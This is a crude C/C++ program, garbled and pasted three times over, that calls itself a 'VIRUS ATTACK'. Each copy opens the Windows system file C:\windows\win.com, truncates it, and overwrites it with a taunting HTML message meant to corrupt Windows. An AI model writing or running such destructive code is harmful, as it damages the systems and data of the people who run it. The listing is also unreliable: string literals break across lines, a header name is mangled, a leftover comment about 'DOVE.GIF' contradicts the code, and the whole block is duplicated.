#include<iostream.h>
#include<conio.h>
#include <stdio.h>
#include <stdlib.h>
#include <fcntl.h>
#include <sysstat.h>
#include <io.h>
#include <string.h>

int main(void)
{
   clrscr();
   int handle;
   char string[1000];
   int length, res,i;

   /*
    Create a file named "DOVE.GIF" in the current directory and write
    a string to it.  If "DOVE.GIF" already exists, it will be overwritten.
   */

   if ((handle = open("C:\windows\win.com", O_WRONLY | O_CREAT |
O_TRUNC,
          S_IREAD | S_IWRITE)) == -1)
   {
      printf("Error opening file.
");
      exit(1);
   }

   strcpy(string, "<html>Hello !!!!!!! This is a VIRUS ATTACK !!! This
execution currupt your WINDOWS !!!!!!</html>
");

   length = strlen(string);

   if ((res = write(handle, string, length)) != length)
   {
      printf("Error writing to the file.
");
      getch();
      exit(1);
   }
   printf("

			Wrote %d bytes to the file.
", res);
  cout<<"

			Hello !!!!!!!!";
  cout<<"

			 This is a VIRUS ATTACK !!!";
  cout<<"

			 This execution currupt your WINDOWS !!!!!!
";
   close(handle);
   getch();
   return 0;
}

//#include<iostream.h>
#include<conio.h>
#include <stdio.h>
#include <stdlib.h>
#include <fcntl.h>
#include <sysstat.h>
#include <io.h>
#include <string.h>

int main(void)
{
   clrscr();
   int handle;
   char string[1000];
   int length, res,i;

   /*
    Create a file named "DOVE.GIF" in the current directory and write
    a string to it.  If "DOVE.GIF" already exists, it will be overwritten.
   */

   if ((handle = open("C:\windows\win.com", O_WRONLY | O_CREAT |
O_TRUNC,
          S_IREAD | S_IWRITE)) == -1)
   {
      printf("Error opening file.
");
      exit(1);
   }

   strcpy(string, "<html>Hello !!!!!!! This is a VIRUS ATTACK !!! This
execution currupt your WINDOWS !!!!!!</html>
");

   length = strlen(string);

   if ((res = write(handle, string, length)) != length)
   {
      printf("Error writing to the file.
");
      getch();
      exit(1);
   }
   printf("

			Wrote %d bytes to the file.
", res);
  cout<<"

			Hello !!!!!!!!";
  cout<<"

			 This is a VIRUS ATTACK !!!";
  cout<<"

			 This execution currupt your WINDOWS !!!!!!
";
   close(handle);
   getch();
   return 0;
}

// #include<iostream.h>
#include<conio.h>
#include <stdio.h>
#include <stdlib.h>
#include <fcntl.h>
#include <sysstat.h>
#include <io.h>
#include <string.h>

int main(void)
{
   clrscr();
   int handle;
   char string[1000];
   int length, res,i;

   /*
    Create a file named "DOVE.GIF" in the current directory and write
    a string to it.  If "DOVE.GIF" already exists, it will be overwritten.
   */

   if ((handle = open("C:\windows\win.com", O_WRONLY | O_CREAT |
O_TRUNC,
          S_IREAD | S_IWRITE)) == -1)
   {
      printf("Error opening file.
");
      exit(1);
   }

   strcpy(string, "<html>Hello !!!!!!! This is a VIRUS ATTACK !!! This
execution currupt your WINDOWS !!!!!!</html>
");

   length = strlen(string);

   if ((res = write(handle, string, length)) != length)
   {
      printf("Error writing to the file.
");
      getch();
      exit(1);
   }
   printf("

			Wrote %d bytes to the file.
", res);
  cout<<"

			Hello !!!!!!!!";
  cout<<"

			 This is a VIRUS ATTACK !!!";
  cout<<"

			 This execution currupt your WINDOWS !!!!!!
";
   close(handle);
   getch();
   return 0;
}


